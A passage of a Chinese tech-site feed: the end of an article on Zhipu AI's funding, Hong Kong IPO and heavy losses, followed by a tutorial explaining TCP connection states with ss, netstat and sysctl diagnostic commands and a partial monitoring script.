<p>针对AI编程场景的订阅产品“GLM Coding plan”上线仅两个月，<strong>全球付费开发者用户便超过15万</strong>，年度经常性收入(ARR)快速破亿。这种从一次性项目到持续服务的转型，是智谱商业模式成熟的关键标志。</p>
<h2 data-id="heading-4">05 资本</h2>
<p>智谱的融资历程反映了AI行业对资本的高度依赖。中科创星于2019年注资4000万元，以3.75亿元投后估值与创始团队共同发起了智谱。<strong>达晨财智则持续参与了多轮融资</strong>，累计投资金额达1.21亿元。</p>
<p>2022年ChatGPT发布后，智谱迎来融资高峰期。产业资本与国资机构成为融资主角：<strong>蚂蚁集团通过旗下基金累计投资6亿元</strong>；美团在B2轮领投3亿元；腾讯在B4轮领投2亿元。</p>
<p>2024年至2025年上市前， <strong>“国家队”资金集中进入</strong>：从中关村科学城投资30亿元开始，杭州城投、上城资本、珠海华发集团、成都高新区等地方国资相继投资。</p>
<p>最后一轮融资，更是汇集了中关村科学城、大兴投资、杭州城创、华发集团、成都高新新经济创投等一众国资机构，<strong>合计注资超20亿元</strong>。这种多元化的股东结构为智谱提供了不同维度的资源支持。</p>
<h2 data-id="heading-5">06 上市</h2>
<p>智谱的上市之路体现了战略灵活性。2025年4月，智谱在北京证监局完成IPO辅导备案，由中金公司担任辅导机构，成为国内第一家正式启动IPO流程的大模型公司。</p>
<p>计划预计7个月完成，目标是2025年内完成上市前的全部合规流程。</p>
<p>然而，2025年7月情况出现调整，<strong>彭博社报道称智谱正评估将IPO地点从内地交易所调整至港交所</strong>。这一调整迅速落实，12月17日，腾讯新闻《一线》从多个信源处获悉，智谱AI已于本周初完成中国证监会备案，并参与了港交所的上市聆讯。</p>
<p>招股书披露，智谱此次计划发行3741.95万股H股，募集资金总额约43亿港元，<strong>IPO市值超过511亿港元</strong>。所募资金净额的70%将用于通用AI大模型研发投入，约10%用于优化MaaS平台。</p>
<p>2025年底，智谱结束招股，券商为其借出1978亿港元孖展，<strong>以公开发售募资额计算超额认购达910倍</strong>，市场反应热烈。</p>
<h2 data-id="heading-6">07 经营</h2>
<p>智谱的财务数据揭示了AI大模型行业的共同特征：高增长伴随高投入。</p>
<p>营收方面，2022年至2024年，<strong>智谱收入分别为5740万元、1.245亿元、3.124亿元</strong>，年复合增长率高达130%；2025年上半年营收同比增幅更是达到325%。毛利率保持在较高水平，2023年达到64.6%。</p>
<p>亏损同样显著。过去三年，<strong>智谱经调整净亏损分别为0.97亿、6.21亿以及24.66亿元</strong>，亏损幅度增长超过20倍。2025年上半年亏损就高达17.52亿元，平均每月亏损接近3亿元。</p>
<p>研发投入是高额亏损的主要原因。2022年至2024年，<strong>智谱的研发开支从8440万元飙升至21.95亿元</strong>，2025年上半年研发投入进一步增至15.95亿元，累计研发投入超44亿元。<strong>算力成本占研发开支的比例从17.3%飙升至70.7%</strong>，2024年的算力服务费达到15.5亿元。</p>
<p>截至2025年6月，智谱的现金及现金等价物仅剩25.52亿元。按每月3亿的烧钱速度计算，若无新资金注入，现金流仅能支撑约9个月。这种资金压力是促使智谱加速上市进程的重要因素。</p>
<h2 data-id="heading-7">08 未来</h2>
<p>上市当天，智谱首席科学家唐杰在内部信中宣布，将很快推出新一代模型GLM-5。唐杰特别提到，<strong>行业竞争给他带来警醒</strong>，表示需要不断改进对AGI技术的追求和未来预判能力。</p>
<p>智谱计划在2026年聚焦四大方向：推出GLM-5模型；<strong>探索超越Transformer的全新模型架构</strong>；研发具有更强泛化能力的强化学习范式；开启持续学习与自主进化的道路，布局下一代在线学习技术。</p>
<p>同时，唐杰透露智谱新设前沿探索部门X-Lab，<strong>聚焦全新模型架构、认知范式研发与新项目孵化</strong>，覆盖软硬件领域；同时将扩大对外投资，拓展新赛道以推动行业生态共荣。</p>
<hr/>
<p>在GLM-4.7模型中，智谱针对编程场景<strong>强化了编码能力、长程任务规划与工具协同</strong>，在多项权威评测中位列开源第一。这些技术创新为用户提供了更高效的工具选择。</p>
<p>智谱已与中国三星合作，将AI能力植入Galaxy S25系列，直接触达消费者，还在珠海高新区投入应用“智谱岗亭机器人”，成为大模型技术赋能基层安防的标杆案例。</p>
<p><strong>一场持续消耗资本的无限游戏中，IPO只是智谱补充燃料的手段</strong>。在激烈的行业竞争中，智谱的上市意味着拿到了下一阶段竞争的入场券，但这远不是终点。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TCP 连接状态详解]]></title>    <link>https://juejin.cn/post/7592789801708994601</link>    <guid>https://juejin.cn/post/7592789801708994601</guid>    <pubDate>2026-01-08T09:57:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708994601" data-draft-id="7592572266754654271" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TCP 连接状态详解"/> <meta itemprop="keywords" content="网络协议"/> <meta itemprop="datePublished" content="2026-01-08T09:57:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户37282486022"/> <meta itemprop="url" content="https://juejin.cn/user/3986167592132954"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TCP 连接状态详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3986167592132954/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户37282486022
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:57:45.000Z" title="Thu Jan 08 2026 09:57:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>TCP 连接状态由 <strong>RFC 793</strong> 定义，共 <strong>11 种标准状态</strong>。以下按连接生命周期详细解释：</p>
<hr/>
<h2 data-id="heading-0"><strong>1. 连接建立阶段</strong></h2>
<h3 data-id="heading-1"><strong>LISTEN (监听)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>0A</code>（十六进制）/ <code>10</code>（十进制）</li>
<li><strong>含义</strong>：服务器端等待客户端的连接请求</li>
<li><strong>触发条件</strong>：调用 <code>listen()</code> 系统调用后</li>
<li><strong>查看方法</strong>：
<pre><code class="hljs language-bash" lang="bash">ss -lnt      <span class="hljs-comment"># 查看所有监听端口</span>
netstat -lnt
</code></pre>
</li>
<li><strong>典型场景</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Web服务器监听</span>
Proto Recv-Q Send-Q Local Address:Port  Peer Address:Port  
tcp   0      0      *:80                *:*              LISTEN
</code></pre>
</li>
</ul>
<h3 data-id="heading-2"><strong>SYN-SENT (同步已发送)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>02</code> / <code>2</code></li>
<li><strong>含义</strong>：客户端发送 SYN 后等待服务器回复</li>
<li><strong>触发条件</strong>：调用 <code>connect()</code> 后，发送 SYN 包</li>
<li><strong>持续时间</strong>：通常很短（RTT + 处理时间）</li>
<li><strong>问题诊断</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 大量SYN-SENT可能表示：</span>
<span class="hljs-comment"># 1. 服务器未响应</span>
<span class="hljs-comment"># 2. 防火墙阻止</span>
ss -ant | grep -c SYN-SENT
</code></pre>
</li>
</ul>
<h3 data-id="heading-3"><strong>SYN-RECEIVED (同步已接收)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>03</code> / <code>3</code></li>
<li><strong>别名</strong>：SYN-RCVD</li>
<li><strong>含义</strong>：服务器收到 SYN，发送 SYN+ACK 后等待客户端 ACK</li>
<li><strong>触发条件</strong>：服务器收到 SYN，发送 SYN+ACK 后</li>
<li><strong>半连接队列</strong>：处于此状态的连接在<strong>半连接队列</strong>（SYN Queue）</li>
<li><strong>安全注意</strong>：<strong>SYN Flood 攻击</strong>的目标状态</li>
<li><strong>调优参数</strong>：
<pre><code class="hljs language-bash" lang="bash">sysctl net.ipv4.tcp_max_syn_backlog    <span class="hljs-comment"># 半连接队列大小</span>
sysctl net.ipv4.tcp_syncookies         <span class="hljs-comment"># 防御SYN Flood</span>
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-4"><strong>2. 连接已建立阶段</strong></h2>
<h3 data-id="heading-5"><strong>ESTABLISHED (已建立连接)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>01</code> / <code>1</code></li>
<li><strong>含义</strong>：连接已建立，可以正常传输数据</li>
<li><strong>触发条件</strong>：完成三次握手后</li>
<li><strong>全连接队列</strong>：从 SYN-RCVD 移入<strong>全连接队列</strong>（Accept Queue）</li>
<li><strong>查看详细</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有已建立连接</span>
ss -nt
<span class="hljs-comment"># 按进程查看</span>
ss -ntp
</code></pre>
</li>
<li><strong>数据传输</strong>：
<pre><code class="hljs language-lua" lang="lua">客户端                                   服务器
  |           ESTABLISHED              |
  | &lt;<span class="hljs-comment">-------------------------------&gt; |</span>
  |         数据自由流动               |
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-6"><strong>3. 连接关闭阶段（正常关闭）</strong></h2>
<h3 data-id="heading-7"><strong>FIN-WAIT-1 (结束等待1)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>04</code> / <code>4</code></li>
<li><strong>含义</strong>：主动关闭方发送 FIN 后，等待对方 ACK</li>
<li><strong>触发条件</strong>：调用 <code>close()</code> 或 <code>shutdown(SHUT_WR)</code></li>
<li><strong>可能转换</strong>：
<pre><code class="hljs language-scss" lang="scss">FIN-WAIT-<span class="hljs-number">1</span> → FIN-WAIT-<span class="hljs-number">2</span>      # 收到ACK
FIN-WAIT-<span class="hljs-number">1</span> → CLOSING         # 同时收到FIN（同时关闭）
FIN-WAIT-<span class="hljs-number">1</span> → <span class="hljs-selector-tag">TIME</span>-WAIT       # 收到FIN+ACK
</code></pre>
</li>
</ul>
<h3 data-id="heading-8"><strong>FIN-WAIT-2 (结束等待2)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>05</code> / <code>5</code></li>
<li><strong>含义</strong>：收到对方对 FIN 的 ACK，等待对方发送 FIN</li>
<li><strong>持续时间</strong>：可保持较长时间（对方还未调用 close）</li>
<li><strong>查看</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看处于此状态的连接</span>
ss -ant | grep FIN-WAIT-2
</code></pre>
</li>
<li><strong>问题</strong>：过多连接可能导致资源耗尽
<pre><code class="hljs language-bash" lang="bash">sysctl net.ipv4.tcp_fin_timeout  <span class="hljs-comment"># 默认60秒</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-9"><strong>CLOSE-WAIT (关闭等待)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>08</code> / <code>8</code></li>
<li><strong>含义</strong>：被动关闭方收到 FIN 后，等待应用层关闭</li>
<li><strong>触发条件</strong>：收到对方的 FIN，发送 ACK 后</li>
<li><strong>关键问题</strong>：<strong>应用层未及时关闭连接</strong>会导致大量 CLOSE-WAIT
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 排查方法</span>
ss -ant | grep CLOSE-WAIT
<span class="hljs-comment"># 找到对应进程</span>
ss -antp | grep CLOSE-WAIT

<span class="hljs-comment"># 常见原因：未调用 close()，连接泄漏</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-10"><strong>CLOSING (正在关闭)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>0B</code> / <code>11</code></li>
<li><strong>含义</strong>：双方<strong>同时尝试关闭</strong>连接（罕见）</li>
<li><strong>触发条件</strong>：
<pre><code class="hljs language-lua" lang="lua">双方几乎同时发送FIN
客户端: FIN-WAIT<span class="hljs-number">-1</span> <span class="hljs-comment">--发送FIN--&gt; 服务器</span>
服务器: FIN-WAIT<span class="hljs-number">-1</span> <span class="hljs-comment">--发送FIN--&gt; 客户端</span>
双方收到对方FIN后进入CLOSING
</code></pre>
</li>
<li><strong>查看</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 通常很少见</span>
ss -ant | grep -c CLOSING
</code></pre>
</li>
</ul>
<h3 data-id="heading-11"><strong>LAST-ACK (最后确认)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>09</code> / <code>9</code></li>
<li><strong>含义</strong>：被动关闭方发送自己的 FIN 后，等待最后 ACK</li>
<li><strong>触发条件</strong>：CLOSE-WAIT 状态的应用调用 close() 后</li>
<li><strong>转换</strong>：收到 ACK 后进入 CLOSED</li>
</ul>
<h3 data-id="heading-12"><strong>TIME-WAIT (时间等待)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>06</code> / <code>6</code></li>
<li><strong>含义</strong>：主动关闭方收到对方的 FIN 并发送 ACK 后</li>
<li><strong>持续时间</strong>：<strong>2MSL</strong>（Maximum Segment Lifetime）
<ul>
<li>默认：<code>60秒</code>（Linux）</li>
<li>查看：<code>sysctl net.ipv4.tcp_fin_timeout</code></li>
</ul>
</li>
<li><strong>目的</strong>：
<ol>
<li>确保对方收到最后的 ACK</li>
<li>让旧连接的数据包在网络中消失</li>
</ol>
</li>
<li><strong>查看和管理</strong>：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 统计数量</span>
ss -ant | grep -c TIME-WAIT

<span class="hljs-comment"># 查看详细信息</span>
ss -ant state time-wait

<span class="hljs-comment"># 调优参数</span>
sysctl net.ipv4.tcp_tw_reuse      <span class="hljs-comment"># 重用TIME-WAIT连接</span>
sysctl net.ipv4.tcp_tw_recycle    <span class="hljs-comment"># 快速回收（谨慎使用）</span>
sysctl net.ipv4.tcp_max_tw_buckets <span class="hljs-comment"># 限制数量</span>
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-13"><strong>4. 特殊/终止状态</strong></h2>
<h3 data-id="heading-14"><strong>CLOSED (关闭)</strong></h3>
<ul>
<li><strong>状态值</strong>：<code>07</code> / <code>7</code></li>
<li><strong>含义</strong>：连接完全关闭，无资源占用</li>
<li><strong>注意</strong>：统计中通常看不到，因为已释放资源</li>
</ul>
<hr/>
<h2 data-id="heading-15"><strong>状态转换图详解</strong></h2>
<pre><code class="hljs language-sql" lang="sql">                              <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
                              <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
                              <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
                  被动打开        <span class="hljs-operator">|</span>     主动打开
                   LISTEN        <span class="hljs-operator">|</span>     SYN<span class="hljs-operator">-</span>SENT
                     <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                <span class="hljs-operator">+</span><span class="hljs-comment">---------+      |        |</span>
                <span class="hljs-operator">|</span>  LISTEN <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                <span class="hljs-operator">+</span><span class="hljs-comment">---------+      |        |</span>
          收到SYN   <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
             发送SYN<span class="hljs-operator">+</span>ACK <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
                     v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
               <span class="hljs-operator">+</span><span class="hljs-comment">-----------+     |        |</span>
               <span class="hljs-operator">|</span>SYN<span class="hljs-operator">-</span>RECEIVED<span class="hljs-operator">|</span><span class="hljs-operator">&lt;</span><span class="hljs-comment">---|--------+</span>
               <span class="hljs-operator">+</span><span class="hljs-comment">-----------+     |  收到ACK</span>
          收到ACK   <span class="hljs-operator">|</span>             <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
              v           <span class="hljs-operator">|</span>        <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+     |        |</span>
          <span class="hljs-operator">|</span>ESTABLISHED<span class="hljs-operator">|</span><span class="hljs-operator">&lt;</span><span class="hljs-comment">--+--------+</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+             连接建立完成</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>     应用数据传输       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              <span class="hljs-operator">|</span>    主动关闭           被动关闭
              <span class="hljs-operator">|</span>   发送FIN             收到FIN
              <span class="hljs-operator">|</span>                      发送ACK
              v                       <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +-----------+</span>
          <span class="hljs-operator">|</span>FIN<span class="hljs-operator">-</span>WAIT<span class="hljs-number">-1</span><span class="hljs-operator">|</span>              <span class="hljs-operator">|</span> <span class="hljs-keyword">CLOSE</span><span class="hljs-operator">-</span>WAIT<span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +-----------+</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
   收到ACK     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>应用调用<span class="hljs-keyword">close</span>
              v                       <span class="hljs-operator">|</span>发送FIN
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
          <span class="hljs-operator">|</span>FIN<span class="hljs-operator">-</span>WAIT<span class="hljs-number">-2</span><span class="hljs-operator">|</span>              <span class="hljs-operator">|</span><span class="hljs-keyword">LAST</span><span class="hljs-operator">-</span>ACK <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
              <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
   收到FIN     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>收到ACK
   发送ACK     <span class="hljs-operator">|</span>                       <span class="hljs-operator">|</span>
              v                       v
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
          <span class="hljs-operator">|</span><span class="hljs-type">TIME</span><span class="hljs-operator">-</span>WAIT<span class="hljs-operator">|</span>               <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+               +---------+</span>
              <span class="hljs-operator">|</span>  等待<span class="hljs-number">2</span>MSL
              v
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
          <span class="hljs-operator">|</span>  CLOSED <span class="hljs-operator">|</span>
          <span class="hljs-operator">+</span><span class="hljs-comment">---------+</span>
</code></pre>
<hr/>
<h2 data-id="heading-16"><strong>完整查看脚本</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># tcp_state_detailed.sh</span>
<span class="hljs-comment"># 查看详细的TCP状态统计</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"================================================"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"            TCP 连接状态详细统计"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"================================================"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 使用 ss 查看（推荐）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【方法1: ss 命令】"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"状态             数量   描述"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"-----------------------"</span>
ss -ant | awk <span class="hljs-string">'NR&gt;1 {print $2}'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> count state; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$state</span> <span class="hljs-keyword">in</span>
        LISTEN)     desc=<span class="hljs-string">"监听端口，等待连接"</span> ;;
        SYN-SENT)   desc=<span class="hljs-string">"客户端已发送SYN"</span> ;;
        SYN-RECV)   desc=<span class="hljs-string">"服务器收到SYN，已回复SYN+ACK"</span> ;;
        ESTAB)      desc=<span class="hljs-string">"连接已建立，数据传输中"</span> ;;
        FIN-WAIT-1) desc=<span class="hljs-string">"主动关闭方发送FIN，等待ACK"</span> ;;
        FIN-WAIT-2) desc=<span class="hljs-string">"收到FIN的ACK，等待对方FIN"</span> ;;
        TIME-WAIT)  desc=<span class="hljs-string">"等待2MSL，确保连接完全关闭"</span> ;;
        CLOSED)     desc=<span class="hljs-string">"连接完全关闭"</span> ;;
        CLOSE-WAIT) desc=<span class="hljs-string">"被动关闭方收到FIN，等待应用关闭"</span> ;;
        LAST-ACK)   desc=<span class="hljs-string">"被动关闭方发送FIN，等待最后ACK"</span> ;;
        CLOSING)    desc=<span class="hljs-string">"双方同时尝试关闭"</span> ;;
        UNKNOWN)    desc=<span class="hljs-string">"未知状态"</span> ;;
        *)          desc=<span class="hljs-string">""</span> ;;
    <span class="hljs-keyword">esac</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-12s %6d    %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">$state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$count</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$desc</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【方法2: /proc/net/tcp 原始数据】"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"状态(十六进制) 数量"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"-------------------"</span>
awk <span class="hljs-string">'{print $4}'</span> /proc/net/tcp | awk -F: <span class="hljs-string">'{print $1}'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> count hex_state; <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">case</span> <span class="hljs-variable">$hex_state</span> <span class="hljs-keyword">in</span>
        0A) state=<span class="hljs-string">"LISTEN"</span> ;;
        01) state=<span class="hljs-string">"ESTABLISHED"</span> ;;
        02) state=<span class="hljs-string">"SYN_SENT"</span> ;;
        03) state=<span class="hljs-string">"SYN_RECV"</span> ;;
        04) state=<span class="hljs-string">"FIN_WAIT1"</span> ;;
        05) state=<span class="hljs-string">"FIN_WAIT2"</span> ;;
        06) state=<span class="hljs-string">"TIME_WAIT"</span> ;;
        07) state=<span class="hljs-string">"CLOSE"</span> ;;
        08) state=<span class="hljs-string">"CLOSE_WAIT"</span> ;;
        09) state=<span class="hljs-string">"LAST_ACK"</span> ;;
        0B) state=<span class="hljs-string">"CLOSING"</span> ;;
        *)  state=<span class="hljs-string">"UNKNOWN(<span class="hljs-variable">$hex_state</span>)"</span> ;;
    <span class="hljs-keyword">esac</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %6s    %6d\n"</span> <span class="hljs-string">"<span class="hljs-variable">$hex_state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$state</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$count</span>"</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【关键指标监控】"</span>
total=$(ss -ant | grep -c -v State)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"总TCP连接数: <span class="hljs-variable">$total</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>

<span class="hljs-comment"># 监控建议</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"【健康检查建议】"</span>
